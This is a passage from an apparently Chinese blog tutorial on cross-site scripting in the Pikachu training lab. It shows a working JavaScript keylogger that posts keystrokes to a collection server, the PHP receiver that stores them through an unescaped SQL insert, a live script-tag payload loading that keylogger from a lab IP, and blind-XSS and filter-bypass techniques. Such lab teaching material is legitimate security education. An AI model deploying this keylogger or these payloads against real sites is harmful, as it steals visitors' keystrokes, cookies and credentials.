<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> \* Created by runner on 2018/7/8.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createAjax</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="keyword">var</span> request=<span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable language_">window</span>.<span class="property">XMLHttpRequest</span>)&#123;</span><br><span class="line">    request=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">    <span class="keyword">if</span>(request.<span class="property">overrideMimeType</span>)&#123;</span><br><span class="line">      request.<span class="title function_">overrideMimeType</span>(<span class="string">&quot;text/xml&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable language_">window</span>.<span class="property">ActiveXObject</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> versions=[<span class="string">&#x27;Microsoft.XMLHTTP&#x27;</span>, <span class="string">&#x27;MSXML.XMLHTTP&#x27;</span>, <span class="string">&#x27;Msxml2.XMLHTTP.7.0&#x27;</span>,<span class="string">&#x27;Msxml2.XMLHTTP.6.0&#x27;</span>,<span class="string">&#x27;Msxml2.XMLHTTP.5.0&#x27;</span>, <span class="string">&#x27;Msxml2.XMLHTTP.4.0&#x27;</span>, <span class="string">&#x27;MSXML2.XMLHTTP.3.0&#x27;</span>, <span class="string">&#x27;MSXML2.XMLHTTP&#x27;</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;versions.<span class="property">length</span>; i++)&#123;</span><br><span class="line">      <span class="keyword">try</span>&#123;</span><br><span class="line">        request=<span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(versions[i]);</span><br><span class="line">        <span class="keyword">if</span>(request)&#123;</span><br><span class="line">          <span class="keyword">return</span> request;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        request=<span class="literal">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> request;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> ajax=<span class="literal">null</span>;</span><br><span class="line"><span class="keyword">var</span> xl=<span class="string">&quot;datax=&quot;</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">onkeypress</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> realkey = <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(event.<span class="property">keyCode</span>);</span><br><span class="line">  xl+=realkey;</span><br><span class="line">  <span class="title function_">show</span>();</span><br><span class="line">&#125;</span><br><span class="line">docunt.<span class="property">onkeypress</span> = onkeypress;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">show</span>(<span class="params"></span>) &#123;</span><br><span class="line">  ajax = <span class="title function_">createAjax</span>();</span><br><span class="line">  ajax.<span class="property">onreadystatechange</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (ajax.<span class="property">readyState</span> == <span class="number">4</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (ajax.<span class="property">status</span> == <span class="number">200</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> data = ajax.<span class="property">responseText</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;页面请求失败&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> postdate = xl;</span><br><span class="line">  ajax.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;http://192.168.149.128/pikachu/pkxss/rkeypress/rkserver.php&quot;</span>,<span class="literal">true</span>);</span><br><span class="line">  ajax.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line">  ajax.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-length&quot;</span>, postdate.<span class="property">length</span>);</span><br><span class="line">  ajax.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Connection&quot;</span>, <span class="string">&quot;close&quot;</span>);</span><br><span class="line">  ajax.<span class="title function_">send</span>(postdate);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码中将获取到的解盘信息发送给pikachu\pkxss\rkeypress目录下的rkserver.php进行处理，并将获取的键盘信息写入到数据库存进行保存。其代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> \* Created by runner.han</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> \* There is nothing new under the sun</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;../inc/config.inc.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;../inc/mysql.inc.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$link</span>=<span class="title function_ invoke__">connect</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置允许被跨域访问</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Access-Control-Allow-Origin:*&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;datax&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;insert keypress(data) values(&#x27;<span class="subst">$data</span>&#x27;)&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$link</span>,<span class="variable">$query</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>接下来我们就在具有存储型XSS的页面构造Payload语句，如下所示：</p>
<script src="http://192.168.149.138/pikachu/pkxss/rkeypress/rk.js"></script>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps101.jpg" alt="img"> </p>
<p>  当别人在访问这个页面时，在这个页面的键盘输入就会被记录下来并写入到数据库，如下图所示：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps102.jpg" alt="img"> </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps103.jpg" alt="img"> </p>
<p>同源和跨域</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps104.jpg" alt="img"> </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps105.jpg" alt="img"> </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps106.jpg" alt="img"> </p>
<h2 id="四、XSS盲打"><a href="#四、XSS盲打" class="headerlink" title="四、XSS盲打"></a>四、<strong>XSS盲打</strong></h2><p>XSS盲打就是攻击者在前端提交的数据不知道后台是否存在XSS漏洞的情况下，提交恶意JS代码在类似留言板等输入框后，所展现的位置在后台，网站采用了攻击者插入的恶意代码，当后台管理员在操作时就会触发插入的恶意代码，从而达到攻击者的目的。也就是通过前端插入的攻击代码，在后台管理系统中生效。</p>
<p>管理后台：<a target="_blank" rel="noopener" href="http://127.0.0.1/pikachu/vul/xss/xssblind/admin_login.php">http://127.0.0.1/pikachu/vul/xss/xssblind/admin_login.php</a></p>
<p>Pikachu盲打Payload：<script>alert('xss')</script></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps107.jpg" alt="img"> </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps108.jpg" alt="img"> </p>
<p>如果插入的代码为盗取cookie的代码，那么管理员的cookie就会被盗取；如果插入的代码为钓鱼代码，提示管理员重新登录，那么就很可能获取管理员的后台账号密码等等。</p>
<h2 id="五、XSS绕过"><a href="#五、XSS绕过" class="headerlink" title="五、XSS绕过"></a>五、<strong>XSS绕过</strong></h2><p><strong>XSS防护措施：前端过滤、后端过滤、WAF等。</strong></p>
<p>大多数网站为了避免XSS的攻击，对攻击者输入都采取了过滤的措施，导致攻击者通常不能正常插入恶意代码来达到攻击目的，但是仍存在一些漏洞可以利用，来绕过过滤措施。</p>
<p>XSS绕过的方法有很多，主要取决于攻击者的思路和对前端技术的掌握，以下介绍一些简单的绕过方法。</p>
<h3 id="5-1-前端代码绕过"><a href="#5-1-前端代码绕过" class="headerlink" title="5.1 前端代码绕过"></a><strong>5.1 前端代码绕过</strong></h3><p>对前端的限制可以尝试进行抓包重发或者修改前端的HTML。比如前面的示例中输入框限制只能输入20个字符的那个，这就是前端限制，但是前端的限制对能力强的攻击者来讲都是无用的。抓包改请求包，或者直接在前端代码中修改等。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml12400\wps109.jpg" alt="img"> </p>
<h3 id="5-2-后端代码绕过"><a href="#5-2-后端代码绕过" class="headerlink" title="5.2 后端代码绕过"></a><strong>5.2 后端代码绕过</strong></h3><h4 id="5-2-1-大小写及双写绕过"><a href="#5-2-1-大小写及双写绕过" class="headerlink" title="5.2.1 大小写及双写绕过"></a><strong>5.2.1 大小写及双写绕过</strong></h4><p>防止后台对输入的内容进行正则匹配来过滤输入，对于这样的过滤可以考虑大小写混合输入的方法。如pikachu\vul\xss目录下xss_01.php的源代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by runner.han</span></span><br><span class="line"><span class="comment"> * There is nothing new under the sun</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$SELF_PAGE</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>],<span class="title function_ invoke__">strrpos</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>],<span class="string">&#x27;/&#x27;</span>)+<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$SELF_PAGE</span> = <span class="string">&quot;xss_01.php&quot;</span>)&#123;</span><br><span class="line">    <span class="variable">$ACTIVE</span> = <span class="keyword">array</span>(<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;active open&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;active&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$PIKA_ROOT_DIR</span> =  <span class="string">&quot;../../&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="variable">$PIKA_ROOT_DIR</span>.<span class="string">&#x27;header.php&#x27;</span>;</span><br><span class="line"><span class="variable">$html</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;submit&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;message&#x27;</span>] != <span class="literal">null</span>)&#123;</span><br><span class="line">    <span class="comment">//这里会使用正则对&lt;script&gt;进行替换为空,也就是过滤掉</span></span><br><span class="line">    <span class="variable">$message</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;message&#x27;</span>]);</span><br><span class="line"><span class="comment">//    $message=str_ireplace(&#x27;&lt;script&gt;&#x27;,&#x27;&#x27;,$_GET[&#x27;message&#x27;]);</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$message</span> == <span class="string">&#x27;yes&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;那就去人民广场一个人坐一会儿吧!&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;别说这些&#x27;<span class="subst">&#123;$message&#125;</span>&#x27;的话,不要怕,就是干!&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">main</span>-<span class="title">content</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">main</span>-<span class="title">content</span>-<span class="title">inner</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">breadcrumbs</span> <span class="title">ace</span>-<span class="title">save</span>-<span class="title">state</span>&quot; <span class="title">id</span>=&quot;<span class="title">breadcrumbs</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">ul</span> <span class="title">class</span>=&quot;<span class="title">breadcrumb</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">i</span> <span class="title">class</span>=&quot;<span class="title">ace</span>-<span class="title">icon</span> <span class="title">fa</span> <span class="title">fa</span>-<span class="title">home</span> <span class="title">home</span>-<span class="title">icon</span>&quot;&gt;&lt;/<span class="title">i</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">a</span> <span class="title">href</span>=&quot;<span class="title">xss</span>.<span class="title">php</span>&quot;&gt;<span class="title">xss</span>&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">li</span> <span class="title">class</span>=&quot;<span class="title">active</span>&quot;&gt;<span class="title">xss</span>之过滤&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">ul</span>&gt;&lt;!-- /.<span class="title">breadcrumb</span> --&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">            &lt;<span class="title">a</span> <span class="title">href</span>=&quot;#&quot; <span class="title">style</span>=&quot;<span class="title">float</span>:<span class="title">right</span>&quot; <span class="title">data</span>-<span class="title">container</span>=&quot;<span class="title">body</span>&quot; <span class="title">data</span>-<span class="title">toggle</span>=&quot;<span class="title">popover</span>&quot; <span class="title">data</span>-<span class="title">placement</span>=&quot;<span class="title">bottom</span>&quot; <span class="title">title</span>=&quot;<span class="title">tips</span>(再点一下关闭)&quot;</span></span><br><span class="line"><span class="class">               <span class="title">data</span>-<span class="title">content</span>=&quot;有些内容被过滤了,试试看怎么绕过?&quot;&gt;</span></span><br><span class="line"><span class="class">                点一下提示~</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">page</span>-<span class="title">content</span>&quot;&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">id</span>=&quot;<span class="title">xssr_main</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">p</span> <span class="title">class</span>=&quot;<span class="title">xssr_title</span>&quot;&gt;阁下,请问你觉得人生苦短吗?&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">get</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">input</span> <span class="title">class</span>=&quot;<span class="title">xssr_in</span>&quot; <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">name</span>=&quot;<span class="title">message</span>&quot; /&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">input</span> <span class="title">class</span>=&quot;<span class="title">xssr_submit</span>&quot; <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">name</span>=&quot;<span class="title">submit</span>&quot; <span class="title">value</span>=&quot;<span class="title">submit</span>&quot; /&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">html</span>;?&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;&lt;!-- /.<span class="title">page</span>-<span class="title">content</span> --&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;&lt;!-- /.<span class="title">main</span>-<span class="title">content</span> --&gt;</span></span><br><span 